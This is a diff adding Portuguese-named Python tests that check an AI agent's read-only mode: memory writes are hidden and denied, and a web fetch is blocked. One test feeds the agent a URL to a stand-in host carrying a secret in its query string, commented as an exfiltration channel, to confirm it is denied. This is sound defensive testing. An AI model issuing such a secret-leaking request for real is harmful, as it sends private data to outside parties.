@@ -417,3 +417,35 @@ async def test_limpeza_durante_turno_e_preserva_memoria(store, policy):
     assert store.context_history(sessao.id) == []
     assert len(store.history(sessao.id)) == 1
     assert store.facts() == [fato]
+
+
+async def test_modo_so_leitura_esconde_e_nega_o_que_nao_e_leitura(store, policy):
+    agent, gw = montar(
+        store,
+        policy,
+        pede(chama("salvar_memoria", texto="x"), chama("buscar_memoria", consulta="x")),
+        fala("ok"),
+    )
+    eventos = await coletar(agent.run("web", "faça", read_only=True))
+    nomes = [t["function"]["name"] for t in gw.ferramentas[0]]
+    assert "salvar_memoria" not in nomes and "buscar_memoria" in nomes
+    decisoes = [(e.data["name"], e.data["decision"]) for e in eventos if e.kind == "tool"]
+    assert decisoes == [("salvar_memoria", "deny"), ("buscar_memoria", "allow")]
+    assert store.facts() == []
+
+
+async def test_modo_so_leitura_nega_o_que_pediria_aprovacao_sem_deixar_pedido(store, policy):
+    web = Tool("buscar_url", "x", {"type": "object", "properties": {}}, lambda: "pagina")
+    agent, _ = montar(
+        store,
+        policy,
+        pede(chama("buscar_url")),
+        pede(chama("buscar_url", url="https://dono.example/?d=SEGREDO")),
+        fala("ok"),
+        extras=[web],
+    )
+    eventos = await coletar(agent.run("web", "pesquise", read_only=True))
+    decisoes = [e.data["decision"] for e in eventos if e.kind == "tool"]
+    assert decisoes == ["allow", "deny"]  # a 2ª sairia por canal de exfiltração e ninguém aprova
+    sessao = store.active_session("web")
+    assert not policy.approvals.unresolved(sessao.id)
